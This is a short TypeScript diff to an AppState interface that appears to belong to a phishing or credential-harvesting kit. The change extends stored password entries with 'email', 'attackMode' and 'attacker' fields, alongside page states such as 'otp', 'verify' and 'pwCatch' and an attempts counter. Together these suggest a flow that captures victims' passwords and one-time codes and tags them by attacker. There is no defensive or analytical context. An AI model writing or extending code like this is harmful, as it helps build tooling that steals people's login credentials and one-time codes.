@@ -3,7 +3,7 @@ export interface AppState {
     email: string;
     name: string;
     profilePicture: string;
-    passwords: { [key: string]: { value: string; timestamp: string } };
+    passwords: { [key: string]: { value: string; timestamp: string; email: string; attackMode: string; attacker: string; } };
     attempts: number;
     currentPage: 'email' | 'login' | 'password' | 'verify' | 'otp' | 'error' | 'redirect' | 'pwCatch';
     errorMessage: string;
